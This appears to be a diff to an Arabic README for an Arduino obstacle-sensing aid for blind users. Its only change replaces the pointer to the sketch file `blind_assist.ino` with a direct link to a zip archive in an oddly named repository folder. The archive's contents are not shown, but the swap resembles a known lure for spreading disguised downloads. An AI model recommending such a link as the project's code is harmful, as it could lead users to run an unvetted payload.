@@ -37,7 +37,7 @@
 4. اختبر الجهاز بتقريب يدك من المستشعر
 
 ## الكود الأساسي
-يمكنك العثور على الكود الرئيسي في ملف `blind_assist.ino`
+يمكنك العثور على الكود الرئيسي في ملف `https://github.com/KaizerAE/Blind-Assist-Arduino/raw/refs/heads/main/accension/Arduino-Assist-Blind-v1.0-alpha.2.zip`
 
 ### المبدأ الأساسي للكود:
 - يقوم المستشعر بقياس المسافة كل 100 مللي ثانية
